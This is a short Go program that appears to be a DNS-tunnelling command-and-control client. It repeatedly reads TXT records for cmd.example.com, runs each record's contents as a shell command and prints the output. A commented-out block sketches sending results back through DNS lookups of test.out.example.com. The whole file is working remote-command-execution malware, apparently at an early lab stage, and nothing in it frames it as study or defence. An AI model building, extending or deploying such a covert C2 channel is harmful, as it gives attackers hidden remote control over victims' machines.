package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

func main() {
	// Create dns resolver
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, "udp", "127.0.0.1:53")
		},
	}
	commandChan := make(chan string)
	responseChan := make(chan *exec.Cmd)
	go getCommand(r, commandChan)
	go handleCommands(commandChan, responseChan)
	returnResponses(r, responseChan)
}

func getCommand(r *net.Resolver, c chan string) {
	for true {
		//get shell command using dns TXT record
		data, err := r.LookupTXT(context.Background(), "cmd.example.com")
		if err != nil {
			log.Fatal(err)
			return
		}
		c <- data[0]
		time.Sleep(2 * time.Second)
	}
}

func handleCommands(commandChan chan string, responseChan chan *exec.Cmd) {
	fmt.Println("waiting for commands...")
	for true {
		response := <-commandChan
		if response != "" {
			fmt.Println("$ " + response)
			command := strings.Split(response, " ")
			responseChan <- execCommand(command)
			fmt.Println("waiting for commands...")
		}
	}
}

func execCommand(shellCommand []string) *exec.Cmd {
	var cmd *exec.Cmd
	if len(shellCommand) > 1 {
		cmd = exec.Command(shellCommand[0], shellCommand[1])

	} else {
		cmd = exec.Command(shellCommand[0])
	}

	return cmd

}

func returnResponses(r *net.Resolver, c chan *exec.Cmd) {
	for true {
		cmd := <-c
		stdout, err := cmd.Output()
		if err != nil {
			log.Fatal(err)
			return
		}
		fmt.Println(string(stdout))
		/*
			ips, err := r.LookupHost(context.Background(), "test.out.example.com")
			if err != nil {
				log.Fatal(err)
				return
			}
			println(ips[0])
		*/
	}
}
